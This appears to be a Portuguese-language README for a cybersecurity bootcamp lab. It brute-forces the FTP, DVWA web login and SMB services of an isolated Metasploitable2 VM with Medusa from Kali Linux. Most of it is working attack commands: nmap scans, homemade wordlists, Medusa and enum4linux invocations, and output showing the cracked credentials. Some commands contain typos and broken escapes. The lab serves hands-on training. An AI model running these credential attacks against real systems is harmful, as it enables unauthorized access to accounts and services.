# Ataque-BruteForce-Medusa

Lab BruteForce - Projeto de Bootcamp de cibersegurança Santander em parceria com a DIO onde foram utilizados scrips, worlists e ferramentas como Medusa no Kali linux contra uma maquina rodando Metasploitable como alvo.

2 VMs no VirtualBox: Kali Linux (atacante) e Metasploitable2/DVWA (alvo)

Rede: Host-only / internal (isolada) IP do alvo usado: 192.168.56.102

1#

ping -c 3 192.168.56.102 

mmap -sV -p 21,22,80,445,139 192.168.56.102

echo -e ‘user\nmsfadmin\nadmin\root’ > users.txt

echo -e ‘123456\npassword\nqwerty\nmsfadmin’ > pass.txt

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

2#

http://192.168.56.102/dvwa/login.php 

echo -e ‘123456\password\nqwerty\nmsfadmin’ > pass.txt

echo -e ‘user\npassword\nqwerty\nmsfadmin/admin’ > users.txt

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http
-m PAGE: ’/dvwa/login.php’
-m FORM: ’username=^USER^&password=^PASS^&Login=Login’
-m ‘FAIL=Login failed’ -t 6

2025-10-26 13:41::02 ACCOUNT FOUND [http] Host: 192.168.56.102 User: admin Password: password [SUCESS] 

3#

enum4linux -a 192.168.56.101 | tee enum4_output.txt

less enum4_output.txt

image
echo -e ‘password\n123456\nWelcome\nmsfadmin’ > senhas_spray.tx

echo -e ‘user\nmsfadmin\nservice’ > smb_users.txt

medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

2025-10-26 13:58:11 ACCOUNT FOUND [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCESS (ADMIN$ - Acess Allowed)]

smbclient -L //192.168.56.102 -U msfadmin 
